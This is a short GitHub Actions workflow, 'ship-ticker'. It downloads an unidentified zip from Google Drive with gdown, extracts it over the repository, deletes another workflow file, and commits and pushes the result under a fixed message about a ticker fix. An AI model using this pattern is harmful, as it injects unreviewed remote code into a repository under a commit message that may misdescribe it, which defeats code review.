name: ship-ticker
on:
  push:
    paths:
      - '.github/workflows/ticker.yml'
permissions:
  contents: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install gdown && gdown 1h9YDI98wZu9sRGavabgGhNV7DvCh5DjS -O /tmp/s.zip && unzip -o /tmp/s.zip -d . && rm -f .github/workflows/pass2.yml
      - run: |
          git config user.name youssef
          git config user.email youssef@example.com
          git add -A
          git commit -m "fix ticker loop width and remove temp workflow"
          git push
